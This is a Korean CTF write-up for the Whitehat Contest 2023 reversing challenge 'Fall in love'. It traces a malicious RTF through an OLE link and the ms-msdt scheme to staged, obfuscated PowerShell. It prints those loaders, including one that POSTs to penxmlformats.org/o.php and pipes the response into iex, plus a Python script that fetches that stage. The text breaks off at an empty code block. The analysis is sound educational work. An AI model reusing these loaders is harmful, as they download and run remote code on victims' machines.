---
title: "Whitehat Contest 2023 Write up"
date: 2023-09-17 +0900
img_path: /assets/img/posts/whitehat_contest_2023_writeup
categories: [WRITE-UP]
tags: ["화이트햇 콘테스트", "whitehat contest", "2023"]
---
## rev - [ rev 3 - Fall in love ]

주어진 파일은 rtf(Rich Text Format) 형식을 갖고 있다. 그래서 해당 파일의 확장자를 rtf로 바꿔주고 열어봤는데 뭔가가 있는 것 같은데 직접 실행되지는 않는다.

![Untitled](Untitled.png)

### 파일 추출

RTF 파일을 리버싱하는 건 처음이라 해당 자료를 찾아 봤는데, RTF 문서에서 실행파일 등을 추출하는 방법을 적어놓을 글을 봤다.

해당 글에 따르면 `objdata`와 `result` 사이의 데이터가 문서에 숨겨진 파일이라고 한다.

그래서 해당 데이터를 추출하고 파일로 만드는 코드를 작성했다.

```python
import binascii

binary = b''
with open('./fallinlove', 'r') as f:
    data = f.readlines()
    tmp = ''
    for i in data:
        tmp += i.strip()
    data = ''.join(tmp)
    start = data.find('objdata') + len('objdata')
    end = data.find('}{\\result')
    binary = data[start+1:end]

binary = binascii.unhexlify(binary)

with open('./binary', 'wb') as f:
    f.write(binary)
```

파일로 만들고 hexdump로 찍어 보니 아래와 같이 뭔가 형식이 있는 파일이 나왔다.

```
00000000  01 05 00 00 02 00 00 00  09 00 00 00 4f 4c 45 32  |............OLE2|
00000010  4c 69 6e 6b 00 00 00 00  00 00 00 00 00 00 0c 00  |Link............|
00000020  00 d0 cf 11 e0 a1 b1 1a  e1 00 00 00 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 3e 00 03 00 fe ff 09  |.........>......|
00000040  00 06 00 00 00 00 00 00  00 00 00 00 00 01 00 00  |................|
00000050  00 01 00 00 00 00 00 00  00 00 10 00 00 02 00 00  |................|
00000060  00 01 00 00 00 fe ff ff  ff 00 00 00 00 00 00 00  |................|
00000070  00 ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
00000080  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
*
00000220  ff fd ff ff ff fe ff ff  ff fe ff ff ff 04 00 00  |................|
00000230  00 fe ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
00000240  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
*
00000420  ff 52 00 6f 00 6f 00 74  00 20 00 45 00 6e 00 74  |.R.o.o.t. .E.n.t|
00000430  00 72 00 79 00 00 00 00  00 00 00 00 00 00 00 00  |.r.y............|
00000440  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000460  00 16 00 05 00 ff ff ff  ff ff ff ff ff 02 00 00  |................|
00000470  00 0c 6a d9 88 92 f1 d4  11 a6 5f 00 40 96 32 51  |..j......._.@.2Q|
00000480  e5 00 00 00 00 00 00 00  00 00 00 00 00 40 e8 4f  |.............@.O|
00000490  40 66 7f d8 01 03 00 00  00 c0 02 00 00 00 00 00  |@f..............|
000004a0  00 01 00 4f 00 6c 00 65  00 00 00 00 00 00 00 00  |...O.l.e........|
000004b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000004e0  00 0a 00 02 00 ff ff ff  ff ff ff ff ff ff ff ff  |................|
000004f0  ff 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000500  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000510  00 00 00 00 00 00 00 00  00 80 01 00 00 00 00 00  |................|
00000520  00 03 00 4f 00 62 00 6a  00 49 00 6e 00 66 00 6f  |...O.b.j.I.n.f.o|
00000530  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000560  00 12 00 02 01 01 00 00  00 03 00 00 00 ff ff ff  |................|
00000570  ff 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000580  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000590  00 00 00 00 00 06 00 00  00 06 00 00 00 00 00 00  |................|
000005a0  00 03 00 4c 00 69 00 6e  00 6b 00 49 00 6e 00 66  |...L.i.n.k.I.n.f|
000005b0  00 6f 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |.o..............|
000005c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000005e0  00 14 00 02 00 ff ff ff  ff ff ff ff ff ff ff ff  |................|
000005f0  ff 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000600  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000610  00 00 00 00 00 07 00 00  00 40 01 00 00 00 00 00  |.........@......|
00000620  00 01 00 00 00 02 00 00  00 03 00 00 00 04 00 00  |................|
00000630  00 05 00 00 00 fe ff ff  ff fe ff ff ff 08 00 00  |................|
00000640  00 09 00 00 00 0a 00 00  00 fe ff ff ff ff ff ff  |................|
00000650  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
*
00000820  ff 01 00 00 02 09 00 00  00 01 00 00 00 00 00 00  |................|
00000830  00 2a 00 00 00 04 03 00  00 00 00 00 00 c0 00 00  |.*..............|
00000840  00 00 00 00 46 02 00 00  00 20 00 0c 00 00 00 5f  |....F.... ....._|
00000850  31 37 31 35 34 39 31 37  35 35 00 00 00 00 00 93  |1715491755......|
00000860  00 00 00 09 03 00 00 00  00 00 00 c0 00 00 00 00  |................|
00000870  00 00 46 02 00 00 00 e0  c9 ea 79 f9 ba ce 11 8c  |..F.......y.....|
00000880  82 00 aa 00 4b a9 0b 4c  00 00 00 68 00 74 00 74  |....K..L...h.t.t|
00000890  00 70 00 73 00 3a 00 2f  00 2f 00 70 00 65 00 6e  |.p.s.:././.p.e.n|
000008a0  00 78 00 6d 00 6c 00 66  00 6f 00 72 00 6d 00 61  |.x.m.l.f.o.r.m.a|
000008b0  00 74 00 73 00 2e 00 6f  00 72 00 67 00 00 00 79  |.t.s...o.r.g...y|
000008c0  58 81 f4 3b 1d 7f 48 af  2c 82 5d c4 85 27 63 00  |X..;..H.,.]..'c.|
000008d0  00 00 00 a5 ab 00 03 04  03 00 00 00 00 00 00 c0  |................|
000008e0  00 00 00 00 00 00 46 02  00 00 00 20 00 01 00 00  |......F.... ....|
000008f0  00 00 ff ff ff ff 00 00  00 00 00 00 00 00 00 00  |................|
00000900  00 00 00 00 00 00 00 00  00 00 ff ff ff ff 00 00  |................|
00000910  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000009a0  00 10 00 03 00 01 00 00  00 00 00 00 00 00 00 00  |................|
000009b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000009e0  00 23 00 68 74 74 70 73  3a 2f 2f 70 65 6e 78 6d  |.#.https://penxm|
000009f0  6c 66 6f 72 6d 61 74 73  2e 6f 72 67 00 00 bb bb  |lformats.org....|
00000a00  cc cc 20 00 68 00 74 00  74 00 70 00 73 00 3a 00  |.. .h.t.t.p.s.:.|
00000a10  2f 00 2f 00 70 00 65 00  6e 00 78 00 6d 00 6c 00  |/./.p.e.n.x.m.l.|
00000a20  66 00 6f 00 72 00 6d 00  61 00 74 00 73 00 2e 00  |f.o.r.m.a.t.s...|
00000a30  6f 00 72 00 67 00 00 00  00 00 00 00 00 00 00 00  |o.r.g...........|
00000a40  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000c20  00 01 05 00 00 00 00 00  00                       |.........|
```

위의 내용에서 `https://penxmlformats.org` 라는 링크가 적혀있는데 이 부분이 수상하여 직접 브라우저로 접속해 보았더니, **“Microsoft 지원 진단 마법사를 여시겠습니까?”** 라는 알림창이 떴다.

![Untitled](Untitled%201.png)

### 첫 번째 스크립트

해당 사이트의 소스코드를 보니 아래처럼 `ms-msdt` protocol scheme을 통해 뭔가를 실행한다는 것을 알 수 있다.

![Untitled](Untitled%202.png)

해당 코드에서 base64으로 인코딩 되어 있는 부분을 디코딩 해보았다.

```powershell
& ( $pShOmE[21]+$pShOme[30]+'x')(NeW-OBjEct  Io.COmpressION.DeFlAtEsTREam( [sysTem.IO.MemoRysTrEAm] [SYSTeM.conVert]::frOMbaSe64stRing( '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'), [iO.coMPReSSioN.coMprESSIonmODe]::dECompReSS)| FOrEAcH{ NeW-OBjEct IO.sTreAmrEADER($_,[SyStEM.TeXt.encOdiNG]::ASciI )} ).rEADToend( )
```

위의 스크립트에서도 base64로 인코딩 된 부분이 있어 똑같이 디코딩 해주었지만 별다른 정보를 얻을 수 없었다.

필자는 Powershell 코드는 잘 모르지만 위에서  `ms-msdt`를 통해 스크립트를 실행하려고 하는 것도 그렇고, 스크립트가 뭔가 Powershell 스크립트 같기도 해서 해당 스크립트를 Powershell에서 돌려보기로 했다.

그대로 복사 붙여넣기를 하면 오류가 나는데 IEX가 문제였다.(`$pShOmE[21]+$pShOme[30]+'x'` )

- IEX(Invoke Expression)
    - 지정된 문자열을 명령으로 실행 및 결과를 반환한다.

따라서 IEX 뒤에 있는 부분이 어떠한 명령을 실행하는 문자열일 것이라고 생각하여 IEX를 제외하고 나머지 부분을 실행시켜 보았다.

```powershell
(NeW-OBjEct  Io.COmpressION.DeFlAtEsTREam( [sysTem.IO.MemoRysTrEAm] [SYSTeM.conVert]::frOMbaSe64stRing( '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'), [iO.coMPReSSioN.coMprESSIonmODe]::dECompReSS)| FOrEAcH{ NeW-OBjEct IO.sTreAmrEADER($_,[SyStEM.TeXt.encOdiNG]::ASciI )} ).rEADToend( )
```

### 두 번째 스크립트

첫 번째 스크립트를 실행시키고 나면 아래처럼 또 길다란 스크립트가 나온다.

두 번째 스크립트도 똑같이 실행을 시켰다

- (가장 맨 끝에 있는 `. ( ([StrinG]$vErbOsEPreFErEnCe)[1,3]+'X'-Join'')` 부분이 IEX다. 동일하게 IEX 부분은 제외하고 실행시키면 된다.)

```powershell
([RuntIMe.INTEroPsERviCEs.MARshaL]::([RuNtIME.INtErOPseRVICes.mARSHal].GetmEmbERS()[1].Name).InvOkE( [rUntIme.intErOpSErvicEs.mARshAl]::SECUREsTRIngtOGLoBALallOCANSi($('76492d1116743f0423413b16050a5345MgB8AGQAVwBVAEEAUAAvAG8AQQA0AFYAVwBTAFUANABXAFcAcwBRAEUAdwBlAHcAPQA9AHwAMAAxADMAZQBiAGMAZQBhAGUAZgA4ADcAMABkADEAOQA3ADUANwAxAGQAMgA0ADUANABkAGIANQBhADUANABlADIANwBjADMAMQA1ADkAMgBlADgAYQBiAGYAYgA2AGIANgA2ADAAMwBjADYAOABiADMAZQBhADgANABjADQAZAA5ADUAZQAyADkAOQAwADYAMQAyAGYANgA2AGMAZgAzAGQAOABjAGMAYQBmAGMAMwAwADYAZQA0ADUAYwAwADMANwBkADEAMQBiAGMAMQAzADgANgBiADgAYwA4ADAAYQBjAGMANwBhADkANQAwADgAYQBjADgAYgBlADgAOQA0ADMAZAA4AGUANwA5AGQAYQBmADUAMgA4ADUAMgBjAGEAOQAzADQAOAA4ADMAZgAwAGQAZQBlAGUAZQA0ADAAOQAyADMAZQA0ADgANABiADcANwA3ADAAYQAxAGEAZQA3ADUAMwBkADcAOAAxADEAMgA5ADMAZgAxADEANgBjADAANgAxAGYAMQA5AGUAMwBhADAAYwBkAGEAOQA3ADkAZAA2ADMAOAA2AGMAMgBjADQAZABhAGUAZgBjADQAZAA0ADAAOAAxAGMAMwA0ADMAYQAwADAAYgAyAGMAZAA3ADEAMgAwADcAMgAyADEAZAA5AGYAMABhADAANwBlAGMAOQA0ADEAYgA5AGMAYQBjADkAYQBjADgAMAAzAGUAYQBiADAAZABhAGQAMABhADcAYgBjAGMANwBiADUAYgAzAGUANQA0ADcAOQAzAGEANgA4AGEAZgA5ADcAZgAyADQANwA3ADkAYwAyADIANAA3AGYAMgAzADYAMwA0ADcAMgBlADUANwBhADgANgBkAGIAMQA3AGYANwBiAGEANQAzADIAMgA5ADAANgBkADUAYQBmADEANgBlAGQAZgA1ADAANQAyADgAZAAwADEAMABlAGEAZgA4ADMAYQA3AGUANAA1ADYANwBlADEAOAA2ADQAZAA1AGQAMQA0ADkAMgAxADkANAAyAGYANQBmAGQAZQBmADIANgAyADcANgBiAGEANgBlADEAYQA0ADQAZgAzAGMAMAAzADcAOAAxADMANgAzAGEAMAA3AGYAZQAyAGQAMwBmAGYAZAA5AGYANwBmAGIAZgBjAGYAMAAwADEAMABjADQANgA0ADEAYgBlAGIAZgA4ADQAMQAxAGMAMgA2ADAAZAAwADcANQBmADYAYgAyAGEANwA1ADcANABlADkANAAzAGUAZAAwADgANwAyADYAMgAwAGEAMQBiADMANAAyAGIAZgBhAGUANAAxADAAMAAyAGUANwA4ADUAMgBmAGEAMQBjADUAYgA0ADEANQBmADQAZQBlADQAMwA5ADQAMwAwAGIAYQAxADcANgBiAGYAZAAyADYANwBmADkANQBmAGIAZAA3AGQAZQBkAGQAYQAwAGIAZQAyADgANgAwADUAMgA5ADkAZQAzAGMANwBiAGIAZQA5ADUANwBiADAAZgBmAGYANgBjAGUAYQA4ADAANgBmADIAMwAwAGIAYwBhADQANABmADUAYQA0AGQAYgBiADQAYgBkADAAMABiADIAYQBhAGYAMgBhAGEAMwA0ADgAOAA5ADgAOAA4ADAAZAAxADIAYQAyADAAYwBhAGIANAA5AGQANQBiADMAMQA1AGQAZQA4ADUAZgA4ADYAZQBlAGQAOQAyAGYANQA3ADIANAAxADcANQBmAGIAMgBhADAANAAxAGUAYQAwAGEAZgA4ADYAMwBkADAANgBlAGQAOQBkADEAOQA5ADAAOQA1ADkANABlADcAZQAwAGUANgAxADUAYgBjAGIAYQBkADAAZQAzAGIAMQBiADEAMABkAGUANwBkADIANAA4ADcAZQA2ADUAZAA1AGEANgAzAGMANwBlADgAZgAwADgAZQA2AGIAYgA2ADkAOQBiADkAZAA4ADcAMwBhADAAYQA0ADMAMQBkADIAMwAyAGQAOABhAGEANwBmADMAMAAzADIANwA5AGUANABjADUAOQBlADgAOQBhADgAMwA5ADgAOQA5ADUANwAzAGQAMgAwADgAZQAzADYAMwA2AGQANAA2ADgAOAA0ADkAMgBhADgANAA1ADQAOQAwAGQAZQBhAGMANQBlAGEANAA0ADkAZAAxADMAMQAxAGEAOABiAGYAMwBlAGYANgBjADEAZQAwADAAYQBlADEAYgBlAGMAZgBiADgAYgBiAGIANgBmADEAMwBiADYAZgAyAGQANABiAGYAYgBhADkANgBkADAAMwBhADkANAA1ADUAMgBjADgAZgBlADUAZQAyAGQAMgBlAGQAMABjAGYAMwBiAGYAMQA1AGIANABhAGUAYQBkADUAMgBmAGYAYwBkAGYAOQA5AGIAZgAxADEAMQBlADYAZgA3AGEAMgBmADAAYQBjADcAOQA5ADEAYwBiAGUANgBhAGIANwBlAGQAYgA4ADAAYQBlAGEAZQAwADkAMQBjAGQAYwBjADcAZAAwADMANABmADQAYQBlAGUANwA2ADIAOABlADcAZQBiADcANgBkADUANgAwAGUAYgA3AGQAMAA1ADkAOQAxADUAMAAwAGMAYQBjAGYANQA5ADgANwBiADEAMwAwAGYAYQBmADYAZgAxAGUAOABiADYAYwBjADIAMQA4AGQAOQA1ADEAZQBkADAANAAyADEAZABlAGIANgBmAGQAZgAxAGEAMAAxADEAYQBiADUAMABlADIAMABjAGQANQAzADkANgBiADcAZAA0AGUAYwAyADQAYwA3ADMAMgBlAGIANwA2ADUAOQA0AGUANABiADIAYgA1AGIANABhADEAYgAxAGYAMABhAGIAMQBkADcAZgA3ADMAYgBhADYAMgBmAGEAYgAzADMAOABhADIAYwA1AGMAZQBkADkANQBlADcAZQBmADQAMgA4AGYANAA4ADQANwA0ADMAMgBlADQAYwBlADYAZABkAGMANQA3AGMAYQBhAGIAYgAwAGUAMABmAGQAMAA1AGIAZAAxADkAYQA1ADEAZAAwAGUAMwBhADkAYgA2ADEAMgA4ADcAYQBhAGYAMwAzADYANQAxADIAOQBlADUANwA4ADMAYwA3AGIANwBjADUAYQBiAGUAOABjADUAMgBhAGQAYwAzADQAMABkADcANQAwADYAMAA3ADgAOABhADUAMABhADUAYgAzAGMAZABmAGMAOABiADIAYgBkADEAZgBmADIAMQAxADEAYwBiADEANwBhADcAOABiADQAYgBmAGMAYgA4ADQAYgA1ADkAYgA5AGQAOAA1ADgANgAxADAANwA2ADEAOABmAGQAMAAzADEANQBiADgAZQAzADMANgBjADcAYwA4ADIAOQAwAGMAZQBmADQAOAA0AGIAZQA1ADEAYwA0ADIAZgAxAGIAMgA5AGIAMQA3ADEAZQBiADgAMwBhADcANABlADcANgAxAGUANgBkADEAZABkADkANAA2ADAANwAxADEAYgBmADAANwA0AGIAYwA4ADcAZQBlADMAZQA4ADcAZQAzAGIAYQAyADEANQBlAGEAOQBhADgANQBiADIAZAAwADgANgAzAGUANwBmADIAOQBjADYANgBhADkAMwA5ADgAMgA0AGQAOQBkADIANgAzAGMAYQA1ADQAMgAyADQAOQA5AGEAYwAzAGIAYQBlADgAMwBkADMAMwA0AGEAMABhADMAYwBkAGUANgA4AGMANgA5ADcAYgBmAGYAMQAzAGIANQBiAGIAZQA4ADcAOQAzAGMAMgA2ADcANAA1ADAAYQA3ADAAMgBlADUAZABjADUAMAA3AGYAYwBhADkANwBmAGEANgA1ADIAZAA3ADMAMgA1AGYANAA1ADgAOQBlADQANQBlADgAOABjADQANQA4ADMAZgA2ADkANAA2AGUAMAA4ADUAMAAxADEAOAA2AGIAMQBlADkAYgBmAGEAYgBjADUAYwAwADgAYwBlADAAOQA4AGIAOQAzADcAYgA5ADMAOQA3ADcAYwA0ADQAYgBjADAAZgA5AGQAYQBlADEANwBlADMAMAAwAGUAZAAzAGQAYgBkADYAOQBhADEAOAA2AGEAMQAwAGMANgA5ADMAZgBmADEANgA4ADcAYQBkAGUAMgA4ADcANQBjAGIAZQA5ADQAMwBmADQAOABlADAAZQBhADcANQA1ADAAMABkADgAYQA4AGEANgBkAGIAMAAwADEANwBmAGIAYQBiADcAYgA=' | coNVerttO-SECUresTRING -kEy (194..225)) ) ) )|. ( ([StrinG]$vErbOsEPreFErEnCe)[1,3]+'X'-Join'')
```

### 세 번째 스크립트

두 번째 스크립트를 실행시키면, 아래와 같이 세 번째 스크립트가 출력된다.

아래의 스크립트를 보면 format에 맞게 문자열을 넣어주는 것을 알 수 있다.

코드를 해석해 보면 다음과 같다.

1. POST method로 `https://penxmlformats.org/o.php` 로 요청을 보낸다.
2. `User-Agent` 는 `K4T4L0G`  로 세팅한다.

```powershell
${H}=&("{0}{2}{1}"-f 'New-Obj','t','ec') -ComObject Msxml2.XMLHTTP;${h}.open(("{0}{1}"-f 'PO','ST'),("{5}{7}{6}{8}{1}{4}{0}{3}{2}"-f'/',('at'+'s'),('ph'+'p'),'o.',('.or'+'g'),('ht'+'tp'),('pe'+'nxmlfo'),('s:/'+'/'),'rm'),${Fa`LsE});${H}.SetRequestHeader(("{2}{3}{1}{0}"-f('gen'+'t'),'A','U',('s'+'er-')), ("{2}{0}{1}" -f'L0','G',('K4T'+'4')));${h}.send();.("{1}{0}"-f'x','ie') ${h}.responseText;
```

코드 해석을 바탕으로 `[https://penxmlformats.org/o.php](https://penxmlformats.org/o.php)` 로 요청을 보내는 코드를 작성했다.

```python
import requests

url = 'https://penxmlformats.org/o.php'
headers = {'User-Agent': 'K4T4L0G'}

res = requests.post(url, headers=headers)

print(res.headers)
print(res.status_code)
print(res.text)
```

### 네 번째 스크립트

위에서 작성한 코드를 실행시키면 Response body에 아래처럼 스크립트가 나온다.

아래의 스크립트도 마찬가지로 IEX를 빼고 나머지 부분을 실행시키면 결과가 출력된다.

```powershell
